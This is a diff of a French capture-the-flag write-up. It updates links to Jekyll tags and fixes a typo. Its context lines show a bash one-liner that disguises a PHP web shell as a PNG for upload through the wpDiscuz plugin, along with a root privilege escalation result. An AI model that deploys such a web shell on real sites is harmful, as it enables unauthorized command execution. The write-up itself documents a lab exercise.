@@ -134,7 +134,7 @@ _______________________________________________________________
 
 ## Exploitation web
 
-Ici on voit la présence du plugin wpDiscuz déjà croisé sur le [CTF Moee de VulnHub](https://devloop.users.sourceforge.net/index.php?article259/solution-du-ctf-moee-de-vulnhub). On va donc tenter à une exploitation similaire en uploadant un script PHP qui fera croire qu'il est une image via l'ajout d'entêtes spécifiques.
+Ici on voit la présence du plugin wpDiscuz déjà croisé sur le [CTF Moee de VulnHub]({% link _posts/2022-01-30-Solution-du-CTF-Moee-de-VulnHub.md %}). On va donc tenter à une exploitation similaire en uploadant un script PHP qui fera croire qu'il est une image via l'ajout d'entêtes spécifiques.
 
 ```bash
 $ echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00<?php system($_GET["cmd"]); ?>' > shell.php
@@ -262,10 +262,10 @@ uid=1002(james) gid=1002(james) euid=0(root) groups=1002(james)
 
 Cela ne fonctionne pas en usurpant la commande cd, certainement car c'est une commande builtin à bash.
 
-On aurait aussi pu se servir des wildcards comme sur le [CTF /dev/random: Pipe](https://devloop.users.sourceforge.net/index.php?article137/solution-du-ctf-dev-random-pipe-de-vulnhub).
+On aurait aussi pu se servir des wildcards comme sur le [CTF /dev/random: Pipe]({% link _posts/2017-11-17-Solution-du-CTF-devrandom-Pipe-de-VulnHub.md %}).
 
 ## Conclusion
 
-Encore un de ces CTFs où l'auteur semble avoir tenté de placer certaines idées, n'a pas réussi à les exploiter lui même et est passé à une solution alternative.
+Encore un de ces CTFs où l'auteur semble avoir tenté de placer certaines idées, n'a pas réussi à les exploiter lui-même et est passé à une solution alternative.
 
 Au final un CTF qui manque de logique.
